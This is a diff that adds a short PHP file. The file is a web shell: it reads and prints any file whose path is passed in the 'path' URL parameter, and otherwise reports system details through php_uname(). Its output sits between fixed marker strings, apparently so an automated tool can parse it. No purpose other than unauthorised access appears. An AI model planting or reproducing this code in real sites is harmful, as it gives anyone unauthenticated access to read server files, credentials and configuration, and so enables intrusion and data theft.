@@ -1,0 +1,15 @@
+<?php
+echo "---SANGRAVA_START---";
+if(isset($_GET['path'])){
+    $path = $_GET['path'];
+    if(file_exists($path)){
+        echo "Content of $path:\n";
+        echo file_get_contents($path);
+    } else {
+        echo "File not found: $path";
+    }
+} else {
+    echo "Ready to read. System: " . php_uname();
+}
+echo "---SANGRAVA_END---";
+?>
